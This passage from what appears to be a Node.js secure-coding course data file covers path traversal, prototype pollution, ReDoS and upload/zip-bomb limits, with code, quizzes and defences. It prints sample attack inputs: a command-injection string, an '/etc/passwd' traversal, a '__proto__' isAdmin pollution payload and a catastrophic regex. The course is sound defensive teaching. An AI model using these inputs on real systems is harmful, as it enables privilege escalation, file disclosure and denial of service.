        "Verified: `path.resolve(base, \"/etc/passwd\")` discards the base and returns `/etc/passwd`, while `path.join` stays inside.",
        "So \"resolve the path\" is only safe with a containment check. Resolve alone is worse than join for an absolute input.",
        "Verified and important: `\"/var/app/uploads-evil/secret.txt\".startsWith(\"/var/app/uploads\")` is `true`, so the obvious containment check passes for a sibling directory.",
        "Compare against `base + path.sep`, or use `path.relative` and reject a leading `..`. Both verified.",
        "Decode before checking, since `..%2f..%2f` resolves out of the directory exactly like `../../`.",
        "Best of all, accept an id rather than a path. Then traversal is not a bug you fixed but one you cannot have.",
      ],
      commonMistakes: [
        "Using `exec` with any interpolated value. The shell reads `;`, `&&`, `|`, `$()` and backticks as punctuation.",
        "Adding `shell: true` to `execFile` to make a pipeline work, which restores the vulnerability and triggers `DEP0190`.",
        "Omitting `--` before a user-controlled argument, so a value starting with `-` becomes a flag.",
        "No `timeout` or `maxBuffer` on a child process, so one request can hang or exhaust memory.",
        "Using `path.resolve` alone for containment, which escapes entirely on an absolute input.",
        "The `startsWith(base)` containment check, which passes for `uploads-evil` and looks completely correct.",
        "Checking the encoded value instead of the decoded one.",
        "Accepting a filename from the client at all, when an id lookup removes the problem.",
        "Serving a stored file without `nosniff` or a separate origin, so an uploaded HTML file runs as your site.",
      ],
      quiz: [
        {
          question: "What was verified about `exec` versus `execFile` with `\"hostname; echo INJECTED\"`?",
          options: [
            "Both ran two commands",
            "`exec` interpreted the `;` and ran two commands; `execFile` passed the whole string as one argument and interpreted nothing",
            "Both treated it as one argument",
            "`execFile` threw",
          ],
          correctIndex: 1,
          explanation:
            "`exec` runs a shell. The safe version is not escaping, it is that no parser is present.",
        },
        {
          question: "What does `execFile(cmd, args, { shell: true })` do?",
          options: [
            "Escapes the arguments safely",
            "Reintroduces the shell, restoring the injection, and Node 24 warns with `DEP0190` that the arguments are only concatenated",
            "Nothing, it is ignored",
            "Runs the command twice",
          ],
          correctIndex: 1,
          explanation:
            "Verified. The runtime is telling you directly that this combination is a vulnerability.",
        },
        {
          question: "What did `path.resolve(\"/var/app/uploads\", \"/etc/passwd\")` return?",
          options: [
            "`/var/app/uploads/etc/passwd`",
            "`/etc/passwd`, because resolve discards the base when the second argument is absolute",
            "An error",
            "`/var/etc/passwd`",
          ],
          correctIndex: 1,
          explanation:
            "`path.join` stayed inside for the same input. So resolve alone is worse than join, and only resolve plus a containment check is safe.",
        },
        {
          question: "Why does `resolved.startsWith(UPLOADS)` fail as a containment check?",
          options: [
            "It is too slow",
            "A sibling directory whose name begins with the same characters passes it. Verified: `/var/app/uploads-evil/secret.txt` starts with `/var/app/uploads`.",
            "`startsWith` is case-sensitive",
            "It only works on Windows",
          ],
          correctIndex: 1,
          explanation:
            "Compare against `UPLOADS + path.sep`, verified `false`, or use `path.relative` and reject a leading `..`.",
        },
        {
          question: "What is the strongest fix for path traversal?",
          options: [
            "A better regex on the filename",
            "Do not accept a path. Take an id, look up the stored key, and there is nothing to traverse.",
            "Always call `path.normalize`",
            "Run the process as a restricted user",
          ],
          correctIndex: 1,
          explanation:
            "Then it is not a bug you fixed but one you cannot have, and the ownership predicate handles authorization at the same time.",
        },
      ],
    },
    {
      id: "prototype-pollution-and-redos",
      title: "Prototype pollution and ReDoS",
      durationMinutes: 12,
      explanation:
        "Two JavaScript-specific vulnerabilities, and both are worse in Node than they sound.\n\n---\n\n## Prototype pollution\n\n<b>Prototype pollution</b> (modifying `Object.prototype` through unsafe property assignment, so every object in the process gains a property).\n\nVerified, step by step:\n\n```text\nJSON.parse('{\"__proto__\":{\"isAdmin\":true}}')\n  → own key \"__proto__\". ({}).isAdmin is undefined. Nothing polluted yet.\n\nnaiveMerge({}, payload)\n  → ({}).isAdmin === true\n```\n\n> The first line matters, because it is the opposite of what people assume. <b>`JSON.parse` is safe</b>: it creates an ordinary own property named `__proto__` and does not touch any prototype. The danger is what you do next. A recursive merge that walks keys and assigns them <b>does</b> reach the prototype, and then every object in the process has the property.\n>\n> So the vulnerable code is not the parser, it is `deepMerge`, `Object.assign` into a nested structure, a `lodash.set` with a user-controlled path, or your own options-merging helper.\n\n---\n\n## Why this is an authorization bug\n\nVerified after pollution:\n\n```javascript\nconst user = { id: 1, name: \"rajan\" };\nuser.isAdmin        // true\n```\n\n> That is the whole vulnerability in one line. Every object now answers `true` to `isAdmin`, including one that has never had the property set, so `if (user.isAdmin)` passes for everybody. Verified: a freshly created `{ name: \"x\" }` also reported `isAdmin` as `true` while `JSON.stringify` still showed only `{\"name\":\"x\"}`, because an inherited property does not serialise.\n>\n> Which is why this belongs in an authorization lesson and why it is so hard to debug: <b>the object looks correct when you log it</b>.\n\n---\n\n## Defences\n\n> The structural one first: <b>a schema with `additionalProperties: false`</b> or a Zod object, from Day 16, drops `__proto__` before it reaches your merge, because it is not a declared field. Day 16 verified that stripping. The single best protection here is validation you already had a reason to add.\n>\n> Then: use `Object.create(null)` for anything keyed by user input, verified to have a `null` prototype. Prefer `structuredClone` or explicit field copying over a hand-written deep merge. And check keys against `__proto__`, `constructor` and `prototype` if you must merge untrusted objects at all.\n>\n> Verified: spreading with `{ ...parsed }` copies `__proto__` as an own key but does <b>not</b> pollute, and `--disable-proto=throw` is accepted by Node 24 as a runtime-level defence.\n\n---\n\n## ReDoS\n\n<b>ReDoS (Regular Expression Denial of Service)</b> (a regular expression that takes exponential time on certain inputs, blocking the process).\n\nVerified with `/^(a+)+$/`:\n\n```text\n20 characters →    23 ms\n24 characters →   100 ms\n28 characters →  1468 ms\n30 characters →  6534 ms\n```\n\n> Ten extra characters multiplied the time by roughly 280. And the part that matters for Node, verified alongside a 5ms interval: during a 7176ms match the event loop ticked <b>0 times</b>.\n>\n> So a <b>30-character request body</b> froze the entire server for seven seconds. Not one request, not one route: everything, including the health check. This is exactly Day 18's `hashSync` finding, except an attacker needs no account and sends 30 bytes.\n\n---\n\n## What to do\n\n> Validate length <b>before</b> the pattern, because a bounded input bounds the backtracking: `z.string().max(64).regex(...)` in that order. Day 16's `.max()` again, now preventing a denial of service rather than a large query.\n>\n> Avoid nested quantifiers such as `(a+)+`, `(a*)*` and `(\\d+)*`, which is the shape that makes this possible. Prefer a simple non-regex check where one exists, since `email.includes(\"@\")` cannot backtrack. And do not paste a complicated regex from the internet into a request path without testing it against a long adversarial string, which takes one line.",
      diagram: `⚠ Prototype pollution: JSON.parse is SAFE

    verified, step by step:

      JSON.parse('{"__proto__":{"isAdmin":true}}')
        → an OWN key named "__proto__"
        → ({}).isAdmin is undefined
        → NOTHING polluted

      naiveMerge({}, payload)
        → ({}).isAdmin === true

    the first line is the opposite of what people
    assume.

    the parser is not the danger.
    WHAT YOU DO NEXT is.

    the vulnerable code is:
      deepMerge
      Object.assign into a nested structure
      lodash.set with a user-controlled path
      your own options-merging helper


Why it belongs in an AUTHORIZATION lesson

    verified after pollution:

      const user = { id: 1, name: "rajan" };
      user.isAdmin        →  true

    every object now answers true, including ones
    that never had the property set.

      if (user.isAdmin)  passes for EVERYBODY

    and verified: a fresh { name: "x" } reported
    isAdmin true while JSON.stringify still showed
    only {"name":"x"}, because an INHERITED
    property does not serialise.

    → which is why it is so hard to debug:

      THE OBJECT LOOKS CORRECT WHEN YOU LOG IT.


Defences, structural first

    a SCHEMA drops __proto__ before your merge
    ever sees it, because it is not a declared
    field.

      additionalProperties: false   (Day 16)
      or a Zod object               (verified
                                     stripping)

    → the best protection here is validation you
      already had a reason to add.

    then:
      Object.create(null) for anything keyed by
        user input   (verified: null prototype)
      structuredClone or explicit field copying
        over a hand-written deep merge
      reject the keys __proto__, constructor,
        prototype if you must merge

    verified:
      { ...parsed } copies __proto__ as an own key
        and does NOT pollute
      --disable-proto=throw is accepted by Node 24


⚠⚠ ReDoS, verified with /^(a+)+$/

    20 chars      23 ms
    24 chars     100 ms
    28 chars    1468 ms
    30 chars    6534 ms

    ten extra characters × ~280.

    and, measured alongside a 5ms interval:

      during a 7176ms match the event loop
      ticked 0 TIMES.

    so a THIRTY-CHARACTER REQUEST BODY froze the
    entire server for SEVEN SECONDS.

      not one request. not one route.
      everything, including the health check.

    exactly Day 18's hashSync finding, except the
    attacker needs no account and sends 30 bytes.


What to do

    VALIDATE LENGTH BEFORE THE PATTERN

      z.string().max(64).regex(...)
                 ^^^^^ in that order

      a bounded input bounds the backtracking.

      Day 16's .max() again, now preventing a
      denial of service instead of a large query.

    avoid NESTED QUANTIFIERS
      (a+)+   (a*)*   (\\d+)*
      ← the shape that makes this possible

    prefer a non-regex check where one exists
      includes("@") cannot backtrack

    do not paste a complicated regex from the
    internet into a request path without testing
    it against a long adversarial string.
    that test is ONE LINE.`,
      codeExample: {
        title: "Both, reproduced and then closed",
        code: `// ═══════════════════════════════════════════════════════════
// Prototype pollution
// ═══════════════════════════════════════════════════════════

// ── Step 1: JSON.parse is not the problem. Verified. ────────
const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');

Object.keys(payload);        // [ '__proto__' ]   ← an OWN key
({}).isAdmin;                // undefined         ← nothing polluted
//
// Worth knowing, because a lot of advice implies you should
// fear the parse. You should fear the merge.


// ── Step 2: the merge is. Verified. ─────────────────────────
function naiveMerge(target, source) {
  for (const k in source) {
    if (typeof source[k] === "object" && source[k] !== null) {
      target[k] ??= {};
      naiveMerge(target[k], source[k]);
    } else {
      target[k] = source[k];
    }
  }
  return target;
}

naiveMerge({}, payload);

({}).isAdmin;                // true              ← POLLUTED
//
// target["__proto__"] resolved to Object.prototype, and the
// recursive call assigned isAdmin onto it. Every object in
// the process now has it.


// ── Step 3: why this is an authorization bug ────────────────
const user = { id: 1, name: "rajan" };

user.isAdmin;                // true              ← VERIFIED
//
// if (user.isAdmin) {
//   return reply.send(await db.select().from(users));
// }
//
// That branch now runs for everyone, including a user object
// built from a row where is_admin is false, because the
// property is inherited rather than set.

JSON.stringify({ name: "x" });    // '{"name":"x"}'
({ name: "x" }).isAdmin;          // true          ← VERIFIED
//
// This is the detail that makes it hard to debug. Log the
// object and it looks exactly right, because an inherited
// property does not serialise. The bug is invisible in
// precisely the tool you would reach for.


// ── ✓ Defence 1: the schema you already have ────────────────
import { z } from "zod";

const updateSettingsSchema = z.object({
  theme: z.enum(["light", "dark"]),
  notifications: z.boolean(),
  locale: z.string().max(10),
});

app.patch("/settings", {
  preHandler: authenticate,
  schema: { body: updateSettingsSchema },
}, async (request) => {
  // Day 16 verified Zod strips unknown keys, so __proto__ is
  // gone before any merge sees it. This is the highest-value
  // defence, and it is validation you wanted anyway.
  return saveSettings(request.user.id, request.body);
});
//
// With plain JSON Schema, remember Day 16's other verified
// finding: unlisted properties pass through by DEFAULT. So
// you need additionalProperties: false here, or __proto__
// arrives intact.


// ── ✓ Defence 2: safe structures and safe copying ───────────
// A map keyed by user input, with no prototype to pollute.
const counts = Object.create(null);
Object.getPrototypeOf(counts);        // null      ← verified
counts[userSuppliedKey] = 1;          // cannot reach a prototype

// Better still, use a Map, which was designed for this.
const byKey = new Map();
byKey.set(userSuppliedKey, 1);

// Spreading is safe. Verified: copies __proto__ as an own key
// and does not pollute.
const copy = { ...JSON.parse('{"__proto__":{"x":1}}') };
({}).x;                               // undefined ← verified

// And explicit copying is safest, for the same reason it beat
// mass assignment in Day 16:
function applySettings(current, input) {
  return {
    theme: input.theme ?? current.theme,
    notifications: input.notifications ?? current.notifications,
    locale: input.locale ?? current.locale,
  };
}
// No loop over untrusted keys means no key can be dangerous.


// ── ✓ Defence 3: a runtime flag ─────────────────────────────
// node --disable-proto=throw server.js
//
// Verified accepted on Node 24. Any access to the __proto__
// accessor throws, which turns a silent pollution into a
// loud stack trace. Worth testing in staging first, since a
// dependency may rely on it.


// ═══════════════════════════════════════════════════════════
// ⚠ ReDoS
// ═══════════════════════════════════════════════════════════

// ── The measurement. Run it. ────────────────────────────────
const bad = /^(a+)+$/;

for (const n of [20, 24, 28, 30]) {
  const input = "a".repeat(n) + "!";
  const t = performance.now();
  bad.test(input);
  console.log(n, Math.round(performance.now() - t) + "ms");
}
// VERIFIED:
//   20    23ms
//   24   100ms
//   28  1468ms
//   30  6534ms
//
// Exponential. Ten more characters is roughly 280 times the
// work, so 40 characters is not a number you want to wait for.


// ── And it blocks everything. Verified. ─────────────────────
let ticks = 0;
const iv = setInterval(() => ticks++, 5);
const t0 = performance.now();
bad.test("a".repeat(30) + "!");
clearInterval(iv);
console.log(Math.round(performance.now() - t0) + "ms,", ticks, "ticks");
// VERIFIED:  7176ms, 0 ticks
//
// Zero. For seven seconds the process served nothing: no
// request, no timer, no health check. Your orchestrator may
// well decide the pod is dead and restart it, which the
// attacker will happily repeat.
//
// Day 18 found the same shape with bcrypt.hashSync. The
// difference is that this one needs no account and 30 bytes.


// ── ✗ How it gets into an application ───────────────────────
app.post("/subscribe", {
  schema: {
    body: z.object({
      email: z.string().regex(
        /^([a-zA-Z0-9_\\.\\-])+\\@(([a-zA-Z0-9\\-])+\\.)+([a-zA-Z0-9]{2,4})+$/,
      ),
    }),
  },
}, handler);
//
// Nobody wrote that regex; it was pasted from a search
// result. It has nested quantifiers, no length bound, and it
// sits on a public unauthenticated endpoint.


// ── ✓ Bound the length first ────────────────────────────────
const emailSchema = z.string().max(254).email();
//                            ^^^^^^^^^ before any pattern

const slugSchema = z.string()
  .max(64)                            // bound, then match
  .regex(/^[a-z0-9]+(?:-[a-z0-9]+)*$/);
//        ^^^^^^^^^^^^^^^^^^^^^^^^^^ no nested quantifier:
//        each character belongs to exactly one group, so
//        there is nothing to backtrack over
//
// A 64-character cap on a pattern that cannot blow up is two
// independent reasons it is safe, which is the defense-in-
// depth lesson applied to a regex.


// ── ✓ And a global body limit as the backstop ───────────────
const app = Fastify({ bodyLimit: 256 * 1024 });
// Even a pathological pattern cannot receive a megabyte of
// adversarial input. Next lesson.


// ── The one-line test worth adding for any new regex ────────
test("slug regex does not backtrack catastrophically", () => {
  const t = performance.now();
  slugSchema.safeParse("a".repeat(64) + "!");
  assert.ok(performance.now() - t < 50);
});
// If a future edit introduces a nested quantifier, this fails
// in CI rather than in production at 3am.`,
      },
      keyTakeaways: [
        "Verified: `JSON.parse('{\"__proto__\":{...}}')` creates an own property and pollutes nothing. The parser is not the danger.",
        "A recursive merge is. Verified: after a naive merge, `({}).isAdmin` was `true`.",
        "So the risky code is `deepMerge`, `Object.assign` into nested structures, `lodash.set` with a user path, or your own options helper.",
        "Verified: `user.isAdmin` was `true` on an object that never had it set, so `if (user.isAdmin)` passes for everybody.",
        "Verified and important for debugging: an inherited property does not serialise, so `JSON.stringify` shows a correct-looking object.",
        "The best defence is a schema. Day 16 verified Zod strips unknown keys, so `__proto__` never reaches your merge.",
        "With plain JSON Schema you need `additionalProperties: false`, because Day 16 verified unlisted properties pass through by default.",
        "Verified: `Object.create(null)` has a `null` prototype, spreading does not pollute, and `--disable-proto=throw` is accepted by Node 24.",
        "Verified ReDoS: `/^(a+)+$/` took 23ms at 20 characters and 6534ms at 30, so ten characters multiplied the work by about 280.",
        "Verified that it blocks everything: during a 7176ms match the event loop ticked 0 times, including the health check.",
        "A 30-character body froze the whole server for seven seconds, and the attacker needed no account.",
        "Bound the length before the pattern: `.max(64).regex(...)` in that order, because a bounded input bounds the backtracking.",
        "Avoid nested quantifiers, prefer a non-regex check where one exists, and test any new regex against a long adversarial string.",
      ],
      commonMistakes: [
        "Fearing `JSON.parse` and trusting your own deep merge. Verified: it is the other way round.",
        "Writing a recursive merge over untrusted keys at all, when explicit field copying does the job with no risk.",
        "Debugging a pollution bug by logging the object, which looks correct because inherited properties do not serialise.",
        "Relying on plain JSON Schema without `additionalProperties: false`, so `__proto__` arrives intact.",
        "Using a plain object as a map keyed by user input instead of `Object.create(null)` or a `Map`.",
        "Pasting a complicated regex into a schema without testing it against a long adversarial string.",
        "Putting `.regex()` before `.max()`, so the pattern runs on unbounded input.",
        "Nested quantifiers such as `(a+)+` or `(\\d+)*`, which is the shape that makes exponential backtracking possible.",
        "Assuming a slow regex is a performance issue. It blocks the event loop, so it is an availability issue for the whole process.",
      ],
      quiz: [
        {
          question: "What was verified about `JSON.parse('{\"__proto__\":{\"isAdmin\":true}}')`?",
          options: [
            "It pollutes `Object.prototype` immediately",
            "It creates an ordinary own property named `__proto__` and pollutes nothing. The danger is a later recursive merge.",
            "It throws",
            "It silently drops the key",
          ],
          correctIndex: 1,
          explanation:
            "Verified: `({}).isAdmin` was `undefined` after the parse and `true` after a naive merge.",
        },
        {
          question: "Why is prototype pollution so hard to debug?",
          options: [
            "It only happens in production",
            "An inherited property does not serialise, so `JSON.stringify` shows a correct-looking object while `user.isAdmin` is `true`",
            "The stack trace is empty",
            "It requires a debugger",
          ],
          correctIndex: 1,
          explanation:
            "Verified both halves. The bug is invisible in exactly the tool you would reach for.",
        },
        {
          question: "What is the highest-value defence against prototype pollution?",
          options: [
            "Freezing `Object.prototype`",
            "A schema that strips unknown keys, so `__proto__` never reaches your merge. Zod does this by default; plain JSON Schema needs `additionalProperties: false`.",
            "Avoiding `JSON.parse`",
            "Using TypeScript",
          ],
          correctIndex: 1,
          explanation:
            "Day 16 verified both behaviours, which makes validation you already wanted the best protection here.",
        },
        {
          question: "What did `/^(a+)+$/` measure at 30 characters, and what happened to the event loop?",
          options: [
            "About 30ms, no effect",
            "6534ms, and during a 7176ms match the event loop ticked 0 times, so the whole process served nothing",
            "It threw a stack overflow",
            "It returned immediately",
          ],
          correctIndex: 1,
          explanation:
            "A 30-character body froze the server for seven seconds, including the health check, and the attacker needed no account.",
        },
        {
          question: "Why does `.max(64)` before `.regex(...)` matter?",
          options: [
            "It is only stylistic",
            "A bounded input bounds the backtracking, so the pattern cannot be handed the long adversarial string that makes it exponential",
            "Zod requires that order",
            "It makes the error message clearer",
          ],
          correctIndex: 1,
          explanation:
            "Day 16's `.max()` again, this time preventing a denial of service rather than a large query.",
        },
      ],
    },
    {
      id: "resource-limits",
      title: "Body limits, uploads and zip bombs",
      durationMinutes: 10,
      explanation:
        "Anything a client can make you allocate or compute is a resource limit you need.\n\n---\n\n## Body limits\n\nVerified: Fastify's default `bodyLimit` is <b>1MB</b>, and exceeding it returns <b>413</b> with `FST_ERR_CTP_BODY_TOO_LARGE`.\n\n> That default is already sensible, which inverts the usual advice. The danger is not that Node accepts a 10GB body, it is what happens when you <b>raise the limit</b> for one file-upload route and set it globally, so every JSON endpoint in the application now accepts 50MB. Ten concurrent requests is then 500MB of heap for endpoints that wanted a hundred bytes.\n>\n> So set the limit <b>per route</b>. Fastify takes `bodyLimit` in the route options, which keeps the global default tight while one upload route gets what it needs.\n\n---\n\n## Uploads\n\n> A file upload needs four separate limits, and people usually set one. <b>Size</b>, so a single file cannot exhaust memory or disk. <b>Count</b>, so a hundred small files are not a way around the size limit. <b>Field count</b>, because a multipart body with fifty thousand fields is its own attack. And a <b>total</b>, since ten files each just under the per-file limit is ten times what you intended.\n>\n> Two more things. Validate the type from the <b>content</b> rather than the filename or the declared type, both of which the client chooses. And store uploads on a <b>different origin</b>, so the headers lesson's content-sniffing problem cannot run a file as your site.\n\n---\n\n## Zip bombs\n\n<b>Zip bomb</b> (a small archive that expands to an enormous amount of data).\n\n```text\n10MB archive → 10GB extracted → CPU, memory and disk exhausted\n```\n\n> The reason a size limit does not help is that the <b>compressed</b> size is what you measured and the <b>expanded</b> size is what hurts you. A 10MB upload passed every check you wrote.\n>\n> The defence is to track expansion <b>while</b> you decompress and abort past a threshold, rather than extracting and then checking. That means streaming, from Day 8: count bytes as they come out and destroy the stream when the ratio or the total is exceeded. Extracting to a temporary directory and then measuring is the version that fills the disk.\n\nThe same applies to any client-supplied compression. A gzipped request body with a 1000:1 ratio is the same attack wearing a different hat, which is why a decompression limit belongs next to your body limit.\n\n---\n\n## The general rule\n\n> Every one of these, plus Day 18's password hashing and this day's ReDoS, is the same asymmetry: <b>the client spends a little and you spend a lot</b>. So the question to ask of any endpoint is what the most expensive request it will accept looks like, and whether that cost is bounded by something other than the client's patience.\n>\n> And it is not only attackers. A retry loop in a mobile client, a colleague's script with no backoff, or a legitimate 200MB CSV all arrive the same way, which is why these limits earn their keep long before anyone attacks you.",
      diagram: `Fastify's default bodyLimit is 1MB. Verified.

    exceeding it →  413
                    FST_ERR_CTP_BODY_TOO_LARGE

    ⚠ which inverts the usual advice.

      the danger is not that Node accepts a 10GB
      body.

      it is what happens when you RAISE the limit
      for one upload route and set it GLOBALLY:

        every JSON endpoint now accepts 50MB
        10 concurrent requests = 500MB of heap
        for endpoints that wanted 100 bytes

    → set bodyLimit PER ROUTE.
      Fastify takes it in the route options.


Uploads need FOUR limits. People set one.

    SIZE         one file cannot exhaust memory
                 or disk
    COUNT        100 small files are not a way
                 around the size limit
    FIELD COUNT  a multipart body with 50,000
                 fields is its own attack
    TOTAL        10 files each just under the
                 per-file limit is 10× what you
                 intended

    two more:

      validate the type from the CONTENT, not the
      filename or the declared type. the client
      chooses both.

      store uploads on a DIFFERENT ORIGIN, so the
      headers lesson's sniffing problem cannot run
      a file as your site.


⚠ Zip bombs: your size limit measured the
  wrong number

    10MB archive → 10GB extracted
                 → CPU, memory, disk

    the COMPRESSED size is what you measured.
    the EXPANDED size is what hurts you.

    a 10MB upload passed every check you wrote.

    the defence: track expansion WHILE
    decompressing and abort past a threshold.

      not extract-then-check.
      extract-then-check is the version that
      fills the disk.

    → streaming (Day 8): count bytes as they come
      out, destroy the stream when the ratio or
      total is exceeded.

    same for any client-supplied compression.
    a gzipped body with a 1000:1 ratio is this
    attack in a different hat, which is why a
    decompression limit belongs next to your body
    limit.


The general rule

    every one of these, plus Day 18's password
    hashing and today's ReDoS, is one asymmetry:

      THE CLIENT SPENDS A LITTLE.
      YOU SPEND A LOT.

    so ask of any endpoint:

      what does the most expensive request it
      will accept look like?

      and is that cost bounded by anything other
      than the client's patience?

    ⚠ and it is not only attackers.

      a retry loop in a mobile client
      a colleague's script with no backoff
      a legitimate 200MB CSV

      all arrive the same way, which is why these
      limits earn their keep long before anyone
      attacks you.`,
      codeExample: {
        title: "Limits that are per-route, and a decompression guard",
        code: `import Fastify from "fastify";
import multipart from "@fastify/multipart";
import { pipeline } from "node:stream/promises";
import { createGunzip } from "node:zlib";
import { Transform } from "node:stream";


// ── Global default: tight ───────────────────────────────────
const app = Fastify({
  bodyLimit: 256 * 1024,        // 256KB for JSON endpoints
});
// Verified: the built-in default is 1MB and returns
//   413 {"statusCode":413,"code":"FST_ERR_CTP_BODY_TOO_LARGE",
//        "error":"Payload Too Large", ...}
//
// 256KB is plenty for a JSON body, and a route that needs
// more says so itself.


// ── ✗ The mistake: raise it globally for one route ──────────
// const app = Fastify({ bodyLimit: 50 * 1024 * 1024 });
//
// One upload route needed 50MB, so now /login accepts 50MB,
// and so does every other endpoint. Ten concurrent requests
// is 500MB of heap for handlers that wanted a hundred bytes,
// and Day 7's memory lesson arrives as an outage.


// ── ✓ Per route ─────────────────────────────────────────────
app.post("/imports/csv", {
  preHandler: [authenticate, app.requirePermission("imports.create")],
  bodyLimit: 20 * 1024 * 1024,
  config: { rateLimit: { max: 5, timeWindow: "1 hour" } },
}, importCsvHandler);
//
// The permission and the rate limit are part of the limit
// story: an expensive route needs a tighter budget than a
// cheap one, whoever is calling it.


// ── Uploads: all four limits ────────────────────────────────
await app.register(multipart, {
  limits: {
    fileSize: 5 * 1024 * 1024,   // per file
    files: 3,                    // count, so 100 small files
                                 //   are not a workaround
    fields: 10,                  // a body with 50,000 fields
                                 //   is its own attack
    fieldSize: 1024,             // and one enormous field is too
    parts: 20,
  },
});

app.post("/avatar", {
  preHandler: authenticate,
  config: { rateLimit: { max: 5, timeWindow: "1 hour" } },
}, async (request, reply) => {
  const file = await request.file();
  if (!file) return reply.code(400).send({ error: "no file" });

  // ⚠ The client chooses both the filename and the mimetype,
  // so neither is evidence. Read the magic bytes.
  const head = await file.file.read(12);
  if (!isJpegOrPng(head)) {
    return reply.code(415).send({ error: "only JPEG or PNG" });
  }

  // A name WE generate, so the path traversal lesson has
  // nothing to work with.
  const key = \`\${randomUUID()}.\${extensionFor(head)}\`;

  await pipeline(file.file, createWriteStream(path.join(UPLOADS, key)));

  // @fastify/multipart sets this when fileSize was hit
  // mid-stream. Check it, or you store a truncated file and
  // report success.
  if (file.file.truncated) {
    await unlink(path.join(UPLOADS, key));
    return reply.code(413).send({ error: "file too large" });
  }

  await db.insert(files).values({
    userId: request.user.id,
    storageKey: key,
    originalName: file.filename.slice(0, 255),
    mimeType: mimeFor(head),
  });

  return reply.code(201).send({ key });
});
//
// And serve these from uploads.example.com rather than
// api.example.com, so the headers lesson's content sniffing
// cannot execute a file on an origin that holds your cookies.


// ── ⚠ The decompression guard ───────────────────────────────
// A size limit measures the COMPRESSED bytes. This measures
// what actually lands.
function limitExpansion(maxBytes, maxRatio, compressedSize) {
  let written = 0;

  return new Transform({
    transform(chunk, _enc, cb) {
      written += chunk.length;

      if (written > maxBytes) {
        return cb(new Error(\`expanded past \${maxBytes} bytes\`));
      }
      if (written / compressedSize > maxRatio) {
        return cb(new Error(\`compression ratio above \${maxRatio}\`));
      }

      cb(null, chunk);
    },
  });
}

app.post("/imports/archive", {
  preHandler: [authenticate, app.requirePermission("imports.create")],
  bodyLimit: 10 * 1024 * 1024,
  config: { rateLimit: { max: 2, timeWindow: "1 hour" } },
}, async (request, reply) => {
  const file = await request.file();
  const compressed = Number(request.headers["content-length"] ?? 0);

  try {
    await pipeline(
      file.file,
      createGunzip(),
      limitExpansion(100 * 1024 * 1024, 100, compressed),
      //             ^^^^^^^^^^^^^^^^^  ^^^
      //             absolute cap       ratio cap
      createWriteStream(destination),
    );
  } catch (err) {
    await unlink(destination).catch(() => {});
    request.log.warn({ err: err.message, userId: request.user.id },
      "archive rejected during decompression");
    return reply.code(413).send({ error: "archive expands too far" });
  }

  return { ok: true };
});
//
// Two caps, because either alone has a hole:
//
//   ratio only     a 1GB upload at a 10:1 ratio is 10GB, and
//                  the ratio was reasonable
//   absolute only  a tiny file at 10,000:1 stays under 100MB
//                  and tells you the client is hostile
//
// And note this aborts DURING decompression. Day 8's streams
// lesson, doing security work: extract-then-measure is the
// version that fills the disk before you find out.


// ── The general question, made concrete ─────────────────────
// For each endpoint, what is the most expensive request it
// will accept?
//
//   POST /login          216ms of a 4-thread pool   (Day 18)
//   POST /subscribe      7s of the event loop, if the regex
//                        is bad and unbounded       (today)
//   POST /imports/csv    20MB of heap × concurrency
//   POST /imports/archive  unbounded, without the guard above
//   GET  /posts          the whole table, without .max()
//                                                   (Day 16)
//
// Every row is the same asymmetry: the client spends a
// little, you spend a lot. Every fix is a bound.`,
      },
      keyTakeaways: [
        "Verified: Fastify's default `bodyLimit` is 1MB and exceeding it returns 413 with `FST_ERR_CTP_BODY_TOO_LARGE`.",
        "So the danger is not that Node accepts huge bodies. It is raising the limit globally for one upload route.",
        "Set `bodyLimit` per route, keeping the global default tight.",
        "An upload needs four limits: per-file size, file count, field count and a total. People usually set one.",
        "Validate the type from the content's magic bytes, since the client chooses both the filename and the declared mimetype.",
        "Check the truncation flag after streaming, or you store a partial file and report success.",
        "Generate the stored filename yourself, so the path traversal lesson has nothing to work with.",
        "Serve uploads from a different origin, so content sniffing cannot execute a file on an origin holding your cookies.",
        "A size limit measures compressed bytes, which is why a 10MB zip bomb passes every check you wrote.",
        "Track expansion during decompression and abort, using Day 8's streams. Extract-then-measure fills the disk before you find out.",
        "Use both an absolute cap and a ratio cap, because either alone has a hole.",
        "Every limit on this day is the same asymmetry: the client spends a little and you spend a lot. Ask what the most expensive accepted request looks like.",
        "These limits earn their keep before any attack, because a retry loop and a legitimate 200MB CSV arrive the same way.",
      ],
      commonMistakes: [
        "Raising the global `bodyLimit` so one upload route works, which lets every endpoint accept the same size.",
        "Setting only a per-file size limit, so a hundred small files or fifty thousand fields go straight through.",
        "Trusting the filename extension or the declared mimetype, both of which the client supplies.",
        "Not checking the truncated flag, so a file cut off at the size limit is stored and reported as a success.",
        "Storing the client's filename as the storage key, reintroducing path traversal.",
        "Serving uploads from your API origin, where a sniffed content type runs with your cookies.",
        "Believing an upload size limit protects against a zip bomb. It measured the compressed size.",
        "Extracting an archive and then checking its size, which is the version that fills the disk.",
        "Using only a ratio cap, so a 1GB upload at a reasonable 10:1 becomes 10GB.",
      ],
      quiz: [
        {
          question: "What is Fastify's default `bodyLimit`, and what does exceeding it return?",
          options: [
            "Unlimited, and a 500",
            "1MB, and a 413 with `FST_ERR_CTP_BODY_TOO_LARGE`",
            "10MB, and a 400",
            "There is no default",
          ],
          correctIndex: 1,
          explanation:
            "Verified. Which means the real risk is raising it globally for one upload route rather than the default being unsafe.",
        },
        {
          question: "Why is a per-file size limit not enough for uploads?",
          options: [
            "It is enough",
            "A hundred small files, fifty thousand form fields, or ten files each just under the cap all bypass it, so you need count, field and total limits too",
            "Sizes are unreliable",
            "Because of compression",
          ],
          correctIndex: 1,
          explanation:
            "Four limits, and people usually set one. Also check the truncation flag, or a cut-off file is stored as a success.",
        },
        {
          question: "Why does an upload size limit fail to stop a zip bomb?",
          options: [
            "Archives bypass body limits",
            "The limit measured the compressed size, and it is the expanded size that exhausts CPU, memory and disk",
            "Compression is not detectable",
            "It does stop it",
          ],
          correctIndex: 1,
          explanation:
            "A 10MB archive passed every check you wrote and expanded to 10GB.",
        },
        {
          question: "How should you guard decompression?",
          options: [
            "Extract to a temp directory and then check the size",
            "Count bytes as they come out and abort mid-stream, with both an absolute cap and a ratio cap",
            "Reject all archives",
            "Set a longer timeout",
          ],
          correctIndex: 1,
          explanation:
            "Extract-then-check fills the disk before you find out. Either cap alone has a hole: 1GB at 10:1 is 10GB, and a tiny file at 10,000:1 stays small.",
        },
        {
          question: "What is the single question that covers every limit in this lesson?",
          options: [
            "Is the input validated?",
